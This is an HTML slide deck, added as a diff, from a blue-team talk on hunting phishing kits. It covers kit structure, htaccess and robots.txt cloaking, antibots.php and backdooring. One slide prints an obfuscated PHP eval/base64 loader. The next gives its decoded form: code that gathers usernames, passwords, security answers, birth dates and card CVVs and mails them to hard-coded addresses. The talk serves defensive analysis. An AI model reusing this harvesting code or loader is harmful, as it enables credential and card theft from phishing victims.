@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+	<html class="sl-root decks export offline loaded">
+	<head>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<title>Copy of Hunting Phish Kits</title>
+
+
+		<link rel="stylesheet" type="text/css" href="lib/hunting-for-phishkits/offline-v2.css">
+
+
+
+	</head>
+	<body class="reveal-viewport theme-font-montserrat theme-color-white-blue">
+		<div class="reveal">
+			<div class="slides">
+				<section data-id="ae9ba5c208f7f9adde07b1b728aae6fa"><div class="sl-block" data-block-type="text" style="width: 806px; left: 557px; top: 428px; height: auto;" data-block-id="c8d987e988a844c7bd1bfb602f0af071"><div class="sl-block-content" data-placeholder-tag="h1" data-placeholder-text="Title Text">
+<h1>Hunting Phish Kits</h1>
+</div></div></section><section data-id="de052ad6866310437c1c850db9cf76c2"><div class="sl-block" data-block-type="text" style="width: 413px; left: 80px; top: 144px; height: auto;" data-block-id="a081056e5fe3864721f96dba7cc43450"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Title Text" style="text-align: left; z-index: 10;">
+<h2>Josh Rickard</h2>
+</div></div>
+<div class="sl-block" data-block-type="text" style="width: 413px; left: 83px; top: 360px; height: auto;" data-block-id="7d3d4c440f721e1f32a5e002adb282a9"><div class="sl-block-content" data-placeholder-tag="p" data-placeholder-text="Lorem ipsum dolor sit amet, consectetur adipiscing elit. Morbi nec metus justo. Aliquam erat volutpat." style="z-index: 11; text-align: left; color: rgb(0, 0, 0);">
+<p>Blue Team<br>
+DFIR</p>
+
+<p>Automate all the things</p>
+
+<p>Open Sorcerer</p>
+</div></div>
+<div class="sl-block" data-block-type="image" style="width: 754px; height: 908px; left: 1006px; top: 28px; min-width: 4px; min-height: 4px;" data-block-id="7cfb7b82ca8cff45ba489eddc201c8f5"><div class="sl-block-content" style="z-index: 13;"><img style="left: -68px; top: 0px; width: 912px; height: 912px;" data-natural-width="960" data-natural-height="960" data-lazy-loaded="" data-crop-x="0.075" data-crop-y="0" data-crop-width="0.827083" data-crop-height="0.995833" data-src="hunting-for-phishkits/12834fc6f3b9d328a8a7344395928ce4.jpg"></div></div>
+<div class="sl-block" data-block-type="text" style="width: 413px; left: 83px; top: 218px; height: auto;" data-block-id="5d9ac348d60e58b783a43c6bbb3dcdd6"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Title Text" style="text-align: left; z-index: 14;">
+<h3>@MSAdministrator</h3>
+</div></div>
+<div class="sl-block" data-block-type="text" style="width: 1860px; left: 28px; top: 966px; height: auto;" data-block-id="7cfa2f620e64fcf0b607992ac3949a81"><div class="sl-block-content" data-placeholder-tag="p" data-placeholder-text="Lorem ipsum dolor sit amet, consectetur adipiscing elit. Morbi nec metus justo. Aliquam erat volutpat." style="z-index: 15; text-align: left; color: rgb(0, 0, 0);">
+<p style="text-align:center"><span style="font-size:1.0em"><span class="css-16my406 css-901oao r-1qd0xha r-ad9z0x r-bcqeeo r-qvutc0">I like long walks through binary trees, #Python &amp; </span><span class="r-18u37iz">#PowerShell</span><span class="css-16my406 css-901oao r-1qd0xha r-ad9z0x r-bcqeeo r-qvutc0"> riding, holding hands with Microsoft, writing romantic experiences about code, git prune all the branches, and deep sea </span><span class="r-18u37iz">#phishing</span></span></p>
+</div></div></section><section class="stack" data-id="e3b4642ee0cb33382b5153abbc2da009"><section data-id="43d2a77272961f2624e60216ac1b6484"><div class="sl-block" data-block-type="text" style="width: 806px; left: 558px; top: 3px; height: auto;" data-block-id="a7c7dd6dd0f08f8c0f6e6b3d586a830c"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Title Text" style="z-index: 11;">
+<h2>What is a Phish Kit?</h2>
+</div></div>
+<div class="sl-block" data-block-type="image" data-block-id="3e722ee4ef67332266b83edbfca0b91b" style="min-width: 4px; min-height: 4px; width: 1354px; height: 919px; left: 286px; top: 117px;"><div class="sl-block-content" style="z-index: 12;"><img style="" data-natural-width="700" data-natural-height="475" data-lazy-loaded="" data-src="hunting-for-phishkits/9a57c9df53fa9ac906839b175b94c817.jpg"></div></div></section><section data-id="1130bb175a65318ac3772039fab7773c"><div class="sl-block" data-block-type="text" style="width: 960px; left: 480px; top: 352px; height: auto;" data-block-id="9943b8dccc180dbfbf1edd333e27dffc"><div class="sl-block-content" data-placeholder-tag="h1" data-placeholder-text="Title Text" style="z-index: 10;">
+<h1>Deployable Web App(s)</h1>
+</div></div>
+<div class="sl-block" data-block-type="text" style="width: 806px; left: 557px; top: 563px; height: auto;" data-block-id="af032ef5406a3f3257416874e64973eb"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Subtitle" style="z-index: 11;">
+<h2>A set of tools for attackers to deploy a phishing exploit/attempt.</h2>
+</div></div></section><section data-id="950a8443f13ec0b6e1ec291ad00eae08"><div class="sl-block" data-block-type="image" data-block-id="31344e770599bb05e9ee1e27eeb1bee7" style="min-width: 4px; min-height: 4px; width: 1902px; height: 1075px; left: 9px; top: 2px;"><div class="sl-block-content" style="z-index: 11;"><img data-natural-width="2500" data-natural-height="1303" style="left: -167px; top: -4px; width: 2069px; height: 1079px;" data-lazy-loaded="" data-crop-x="0.080768" data-crop-y="0.003529" data-crop-width="0.919232" data-crop-height="0.996471" data-src="hunting-for-phishkits/61ba4d06531d3187c8d231a121fd0cdd.png"></div></div></section><section data-id="4cc8c6a46abb18087c024a1d1cea2c9e"><div class="sl-block" data-block-type="image" data-block-id="c43901f1f58bba3cc2491ca45e259a15" style="min-width: 4px; min-height: 4px; width: 1918px; height: 1080px; left: 2px; top: 0px;"><div class="sl-block-content" style="z-index: 11;"><img style="left: -154px; top: 0px; width: 2072px; height: 1080px;" data-natural-width="2500" data-natural-height="1303" data-crop-x="0.074143" data-crop-y="0" data-crop-width="0.925857" data-crop-height="1" data-lazy-loaded="" data-src="hunting-for-phishkits/a835e8380b8fe1eefb903f4cc9c554e1.png"></div></div></section><section data-id="e32a7dc5cd87262b10f80386e4110673">
+<div class="sl-block" data-block-type="text" style="width: 806px; left: 557px; top: 764px; height: auto;" data-block-id="7034240e4b3291abfda4f07263636a05"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Title Text" style="z-index: 11;"><h2>Title Text</h2></div></div>
+<div class="sl-block" data-block-type="image" data-block-id="c539516ce8dafd2af5341b81df28cd29" style="min-width: 4px; min-height: 4px; width: 1920px; height: 1074px; left: 0px; top: 3px;"><div class="sl-block-content" style="z-index: 12;"><img data-natural-width="2019" data-natural-height="1350" style="left: 0px; top: 0px; width: 1920px; height: 1283px;" data-lazy-loaded="" data-crop-x="0" data-crop-y="0" data-crop-width="1" data-crop-height="0.836841" data-src="hunting-for-phishkits/3a2996e263468bef70f59f5c1059b71b.png"></div></div></section><section data-id="915f84f186eb5d50b92185e67a938838"><div class="sl-block" data-block-type="image" data-block-id="a3800e3701d58f0d48a0adf60844b280" style="min-width: 4px; min-height: 4px; width: 1920px; height: 1074px; left: 0px; top: 3px;"><div class="sl-block-content" style="z-index: 11;"><img style="left: 0px; top: 0px; width: 1920px; height: 1087px;" data-natural-width="2386" data-natural-height="1350" data-crop-x="0" data-crop-y="0" data-crop-width="1" data-crop-height="0.988304" data-lazy-loaded="" data-src="hunting-for-phishkits/27ade91d83723e51efb3d84e2d76d986.png"></div></div></section><section data-id="c27dc44b0eb0463752d7a44b062a92ee"><div class="sl-block" data-block-type="image" data-block-id="c7d66c63ac6bb72ee9e77fd18a62db20" style="min-width: 4px; min-height: 4px; width: 1457px; height: 1080px; left: 232px; top: 0px;"><div class="sl-block-content" style="z-index: 11;"><img data-natural-width="1808" data-natural-height="1340" style="" data-lazy-loaded="" data-src="hunting-for-phishkits/c52b97e008da518f63171261e2756f76.png"></div></div></section><section data-id="6208111725ebbf07834e6d59b10febad"><div class="sl-block" data-block-type="text" style="width: 806px; left: 557px; top: 0px; height: auto;" data-block-id="b331bc46454edc0f87122176f9ce751c"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Title Text" style="z-index: 11;">
+<h2>backdooring</h2>
+</div></div>
+
+
+<div class="sl-block" data-block-type="image" data-block-id="5aef7c571a0386d4e68c0da416cd74d5" style="min-width: 4px; min-height: 4px; width: 1920px; height: 511px; left: 0px; top: 281px;"><div class="sl-block-content" style="z-index: 12;"><img style="" data-natural-width="1304" data-natural-height="347" data-lazy-loaded="" data-src="hunting-for-phishkits/73748e6f7f3ce9fc0bfb7b8bdd68ed57.png"></div></div></section><section data-id="e54fa4c9423423ec17cb9ae234c2f3b8">
+<div class="sl-block" data-block-type="text" style="width: 1920px; left: 0px; top: 5px; height: auto;" data-block-id="8f4cb42752fed21a2b46a61e50d9208f"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Subtitle" style="z-index: 11; font-size: 45%;" dir="ui">
+<p><span style="font-size:2.0em"><span style="color:#56b6c2">eval</span>(<span style="color:#56b6c2">str_rot13</span>(<span style="color:#56b6c2">gzinflate</span>(<span style="color:#56b6c2">str_rot13</span>(<span style="color:#56b6c2">base64_decode</span>(<span style="color:#98c379">'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'</span>)))));</span></p>
+
+<p> </p>
+</div></div></section><section data-id="e0b1046f429d66b820bb9a041a551336"><div class="sl-block" data-block-type="text" style="width: 806px; left: 554px; top: 0px; height: auto;" data-block-id="4ec3943c1c012c05365201c0fdcc987d"><div class="sl-block-content" data-placeholder-tag="h1" data-placeholder-text="Title Text" style="z-index: 11;">
+<h1>Debofuscated Code</h1>
+</div></div>
+<div class="sl-block" data-block-type="text" style="width: 806px; left: 188px; top: 83px; height: auto;" data-block-id="c539a095d610e54c98f7a46e2e326bf2"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Subtitle" style="z-index: 12; font-size: 45%;">
+<p style="text-align:left"><span style="font-size:1.8em">$user = $_SESSION['username'];</span></p>
+
+<p style="text-align:left"><span style="font-size:1.8em">$pass = $_SESSION['password'];</span></p>
+
+<p style="text-align:left"><span style="font-size:1.8em">$q1= $_SESSION['question1'];</span></p>
+
+<p style="text-align:left"><span style="font-size:1.8em">$a1 = $_SESSION['answer1'];</span></p>
+
+<p style="text-align:left"><span style="font-size:1.8em">$q2 = $_SESSION['question2'];</span></p>
+
+<p style="text-align:left"><span style="font-size:1.8em">$a2 = $_SESSION['answer2'];</span></p>
+
+<p style="text-align:left"><span style="font-size:1.8em">$q3 = $_SESSION['question3'];</span></p>
+
+<p style="text-align:left"><span style="font-size:1.8em">$a3 = $_SESSION['answer3'];</span></p>
+
+<p style="text-align:left"><span style="font-size:1.8em">$dob = $_SESSION['dob'];</span></p>
+
+<p style="text-align:left"><span style="font-size:1.8em">$exp = $_SESSION['exp'];</span></p>
+
+<p style="text-align:left"><span style="font-size:1.8em">$cvv = $_SESSION['cvv'];</span></p>
+
+<p style="text-align:left"> </p>
+
+<p style="text-align:left"><span style="font-size:1.8em">if (getenv('HTTP_CLIENT_IP')){</span></p>
+
+<p style="text-align:left"><span style="font-size:1.8em">$ip=getenv('HTTP_CLIENT_IP');}</span></p>
+
+<p style="text-align:left"><span style="font-size:1.8em">else {</span></p>
+
+<p style="text-align:left"><span style="font-size:1.8em">$ip=getenv('REMOTE_ADDR');}</span></p>
+
+<p style="text-align:left"><span style="font-size:1.8em">$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);</span></p>
+
+<p style="text-align:left"><span style="font-size:1.8em">$browser = $_SERVER['HTTP_USER_AGENT'];</span></p>
+
+<p style="text-align:left"><span style="font-size:1.8em">$data = "---------------------bmr---------------------</span></p>
+
+<p style="text-align:left"><span style="font-size:1.8em">User: $user</span></p>
+
+<p style="text-align:left"><span style="font-size:1.8em">Pass: $pass</span></p>
+
+<p style="text-align:left"><span style="font-size:1.8em">-</span></p>
+
+<p style="text-align:left"><span style="font-size:1.8em">Q1 : $q1</span></p>
+
+<p style="text-align:left"><span style="font-size:1.8em">A1 : $a1</span></p>
+
+<p style="text-align:left"> </p>
+
+<p style="text-align:left"><span style="font-size:1.8em">Q2 : $q2</span></p>
+
+<p style="text-align:left"><span style="font-size:1.8em">A2 : $a2</span></p>
+
+<p style="text-align:left"><span style="font-size:1.8em">Q3 : $q3</span></p>
+
+<p style="text-align:left"><span style="font-size:1.8em">A3 : $a3</span></p>
+
+<p style="text-align:left"> </p>
+</div></div>
+<div class="sl-block" data-block-type="text" data-block-id="7a519bcaf5aaf6bc1f4e9dfacb88659d" style="height: auto; min-width: 30px; min-height: 30px; width: 600px; left: 1120px; top: 212px;"><div class="sl-block-content" data-placeholder-tag="p" data-placeholder-text="Text" style="z-index: 13;">
+<p style="font-size:13.5px; text-align:left"><span style="font-size:1.8em">dob: $dob</span></p>
+
+<p style="font-size:13.5px; text-align:left"><span style="font-size:1.8em">exp: $exp</span></p>
+
+<p style="font-size:13.5px; text-align:left"><span style="font-size:1.8em">cvv: $cvv</span></p>
+
+<p style="font-size:13.5px; text-align:left"> </p>
+
+<p style="font-size:13.5px; text-align:left"><span style="font-size:1.8em">-</span></p>
+
+<p style="font-size:13.5px; text-align:left"><span style="font-size:1.8em">Browser: $browser</span></p>
+
+<p style="font-size:13.5px; text-align:left"><span style="font-size:1.8em"> IP: $ip</span></p>
+
+<p style="font-size:13.5px; text-align:left"><span style="font-size:1.8em">---------------------BMO---------------------</span></p>
+
+<p style="font-size:13.5px; text-align:left"><span style="font-size:1.8em">";</span></p>
+
+<p style="font-size:13.5px; text-align:left"> </p>
+
+<p style="font-size:13.5px; text-align:left"><span style="font-size:1.8em">$un = "multic62@yandex.com";</span></p>
+
+<p style="font-size:13.5px; text-align:left"><span style="font-size:1.8em">$do = "sco314159265395.com";</span></p>
+
+<p style="font-size:13.5px; text-align:left"><span style="font-size:1.8em">$tr = "fi5319624@gmail.com";</span></p>
+
+<p style="font-size:13.5px; text-align:left"> </p>
+
+<p style="font-size:13.5px; text-align:left"> </p>
+
+<p style="font-size:13.5px; text-align:left"> </p>
+
+<p style="font-size:13.5px; text-align:left"> </p>
+
+<p style="font-size:13.5px; text-align:left"> </p>
+
+<p style="font-size:13.5px; text-align:left"><span style="font-size:1.8em">$subj = "Bmer $user#$pass#";</span></p>
+
+<p style="font-size:13.5px; text-align:left"><span style="font-size:1.8em"> if ($_SESSION['username'] != "" ) {</span></p>
+
+<p style="font-size:13.5px; text-align:left"><span style="font-size:1.8em">    mail($un,$subj,$data);</span></p>
+
+<p style="font-size:13.5px; text-align:left"><span style="font-size:1.8em">    mail($do,$subj,$data);</span></p>
+
+<p style="font-size:13.5px; text-align:left"><span style="font-size:1.8em">    mail($tr,$subj,$data);</span></p>
+
+<p style="font-size:13.5px; text-align:left"><span style="font-size:1.8em">}</span></p>
+</div></div></section><section data-id="e35fc3c43af206d4b84f0594964c428c"><div class="sl-block" data-block-type="image" data-block-id="aac1b1e77143dd2c47b389d74980298d" style="min-width: 4px; min-height: 4px; width: 1920px; height: 960px; left: 0px; top: 60px;"><div class="sl-block-content" style="z-index: 11;"><img data-natural-width="790" data-natural-height="395" style="" data-lazy-loaded="" data-src="hunting-for-phishkits/edc784de39cd6e2df01e2a71c779744e.jpeg"></div></div>
+<div class="sl-block" data-block-type="text" data-block-id="965165876949830c3a7b0b9133390676" style="height: auto; min-width: 30px; min-height: 30px; width: 1018px; left: 371px; top: 1041px;"><div class="sl-block-content" data-placeholder-tag="p" data-placeholder-text="Text" style="z-index: 12;">
+<p><span style="font-size:0.7em"><span style="color:#A9A9A9">https://media.pitchfork.com/photos/5d66f433ff912900082415fc/2:1/w_790/TeeJay6.png</span></span></p>
+</div></div></section><section data-id="e7eb5ffe19310e2c3c900375e22dc293"><div class="sl-block" data-block-type="text" style="width: 825px; left: 58px; top: 130px; height: auto;" data-block-id="cc8b78eb4baa712a8f3e5878e5cce878"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Title Text" style="text-align: left; z-index: 10;">
+<h2>img/</h2>
+</div></div>
+<div class="sl-block" data-block-type="text" style="width: 825px; left: 55px; top: 377px; height: auto;" data-block-id="e7342b309bb91a1676f31af9402f18ce"><div class="sl-block-content" data-placeholder-tag="p" data-placeholder-text="Lorem ipsum dolor sit amet, consectetur adipiscing elit. Morbi nec metus justo. Aliquam erat volutpat." style="z-index: 12; text-align: left;">
+<ul>
+	<li>
+	<pre>reduce network communications with the original / cloned site</pre>
+	</li>
+	<li>
+	<pre>increase backwards compatibility</pre>
+	</li>
+	<li>
+	<pre>And typical confirmation pages for websites require specific images to replicate the users expected experience.</pre>
+	</li>
+</ul>
+</div></div>
+<div class="sl-block" data-block-type="image" style="width: 1035px; height: 889px; left: 885px; top: 96px; min-width: 4px; min-height: 4px;" data-block-id="748bb241720fd9ee7141ee1a1a70faf1"><div class="sl-block-content" style="z-index: 11;"><img data-natural-width="1572" data-natural-height="1350" style="" data-lazy-loaded="" data-src="hunting-for-phishkits/da58d968c695cad05b38140ed14a7555.png"></div></div></section><section data-id="7214f14139ea179836d85bd21ff2c1c2"><div class="sl-block" data-block-type="image" style="width: 365px; height: 1080px; left: 553px; top: 0px; min-width: 4px; min-height: 4px;" data-block-id="a595a41a3f0dac9466d1102a5d2263eb"><div class="sl-block-content" style="z-index: 10;"><img data-natural-width="374" data-natural-height="1106" style="" data-lazy-loaded="" data-src="hunting-for-phishkits/d944edc6a29abd0c4a810ae500d637bd.png"></div></div>
+<div class="sl-block" data-block-type="image" data-block-id="9b96ae0fdd76963bdb0198d29a723ad8" style="min-width: 4px; min-height: 4px; width: 450px; height: 1080px; left: 1470px; top: 0px;"><div class="sl-block-content" style="z-index: 11;"><img style="" data-natural-width="469" data-natural-height="1126" data-lazy-loaded="" data-src="hunting-for-phishkits/c593212abbd2818d535e900f4c176247.png"></div></div>
+<div class="sl-block" data-block-type="image" data-block-id="f05253e03ab001007c5e5be6b0a18b18" style="min-width: 4px; min-height: 4px; width: 552px; height: 1080px; left: 918px; top: 0px;"><div class="sl-block-content" style="z-index: 13;"><img style="" data-natural-width="576" data-natural-height="1126" data-lazy-loaded="" data-src="hunting-for-phishkits/599f0a1d20803cde563bd5ed0ccc251b.png"></div></div>
+<div class="sl-block" data-block-type="text" style="width: 825px; left: 58px; top: 130px; height: auto;" data-block-id="c50e9b8d06543ed54803d98ad1c6e5ae"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Title Text" style="text-align: left; z-index: 14;">
+<h2>htaccess</h2>
+</div></div>
+<div class="sl-block" data-block-type="text" style="width: 413px; left: 49px; top: 237px; height: auto;" data-block-id="bdab1ca115c0efdde3403986de8be9fa"><div class="sl-block-content" data-placeholder-tag="p" data-placeholder-text="Lorem ipsum dolor sit amet, consectetur adipiscing elit. Morbi nec metus justo. Aliquam erat volutpat." style="z-index: 15; text-align: left;">
+<ul>
+	<li>Blocking entire CIDR blocks or specific IPs</li>
+	<li>Redirecting based on user-agent string used</li>
+</ul>
+</div></div></section><section data-id="2b52facabcec813a637e7f4e6370c632"><div class="sl-block" data-block-type="text" style="width: 413px; left: 1187px; top: 142px; height: auto;" data-block-id="11851ee7e5cbfca73e621b47e88ce681"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Title Text" style="text-align: left; z-index: 11;">
+<h2>robots.txt</h2>
+</div></div>
+<div class="sl-block" data-block-type="text" style="width: 413px; left: 1187px; top: 308px; height: auto;" data-block-id="6a78c52660d7a972047a42982105541c"><div class="sl-block-content" data-placeholder-tag="p" data-placeholder-text="Lorem ipsum dolor sit amet, consectetur adipiscing elit. Morbi nec metus justo. Aliquam erat volutpat." style="z-index: 12; text-align: left;">
+<ul>
+	<li>Disallow access to specific directories</li>
+	<li>Sometimes also used to block specific user-agent strings</li>
+</ul>
+</div></div>
+<div class="sl-block" data-block-type="image" data-block-id="870b7e97175beb120c368e02197c27d1" style="min-width: 4px; min-height: 4px; width: 419px; height: 1080px; left: 0px; top: 0px;"><div class="sl-block-content" style="z-index: 13;"><img data-natural-width="264" data-natural-height="680" style="" data-lazy-loaded="" data-src="hunting-for-phishkits/66310fdb29c70fd21b3dcfeec3656b34.png"></div></div>
+<div class="sl-block" data-block-type="image" data-block-id="4cfa56e9f418641a0d24506d728f7650" style="min-width: 4px; min-height: 4px; width: 558px; height: 1077px; left: 426px; top: 0px;"><div class="sl-block-content" style="z-index: 14;"><img style="left: 0px; top: 0px; width: 558px; height: 1403px;" data-natural-width="537" data-natural-height="1350" data-crop-x="0" data-crop-y="0" data-crop-width="1" data-crop-height="0.767421" data-lazy-loaded="" data-src="hunting-for-phishkits/39286fdb0b38f5241ee4782c2f23ad6c.png"></div></div></section><section data-id="f6ce2f469bda98d5cad64a1d2506fab6"><div class="sl-block" data-block-type="text" style="width: 806px; left: 557px; top: 232px; height: auto;" data-block-id="d6063fe2173594268a89d9a141c9d841"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Title Text" style="z-index: 10;"><h2>Title Text</h2></div></div>
+<div class="sl-block" data-block-type="image" style="width: 1474px; height: 1080px; left: 223px; top: 0px; min-width: 4px; min-height: 4px;" data-block-id="22bc51965109b9042c4047dc65684281"><div class="sl-block-content" style="z-index: 11;"><img style="left: 0px; top: 0px; width: 1597px; height: 1080px;" data-natural-width="1260" data-natural-height="852" data-lazy-loaded="" data-crop-x="0" data-crop-y="0" data-crop-width="0.922705" data-crop-height="1" data-src="hunting-for-phishkits/ebfcc88bf3fcf034baac9c632cde4889.png"></div></div></section><section data-id="337e3afc5982adedfcd8e6a800e5b5cc">
+<div class="sl-block" data-block-type="text" style="width: 806px; left: 557px; top: 0px; height: auto;" data-block-id="96f8e7a9b298155e42a0201f5fd28404"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Title Text" style="z-index: 11;">
+<h2>antibots.php</h2>
+</div></div>
+<div class="sl-block" data-block-type="image" data-block-id="f3fd897f795751617948d8c4501d97fc" style="min-width: 4px; min-height: 4px; width: 1920px; height: 1012px; left: 0px; top: 68px;"><div class="sl-block-content" style="z-index: 12;"><img data-natural-width="2500" data-natural-height="1318" style="" data-lazy-loaded="" data-src="hunting-for-phishkits/8a032e072a496188d466fbe2c29d96fc.png"></div></div></section><section data-id="bbd2c3509054eb1c6943a5f5b9bef24e"><div class="sl-block" data-block-type="image" data-block-id="2aced692a8c3cfd45f443357b72ea919" style="min-width: 4px; min-height: 4px; width: 931px; height: 1080px; left: 0px; top: 0px;"><div class="sl-block-content" style="z-index: 10;"><img style="" data-natural-width="1164" data-natural-height="1350" data-lazy-loaded="" data-src="hunting-for-phishkits/4102c56d8d4ce03a6659f4f0b12e1a34.png"></div></div>
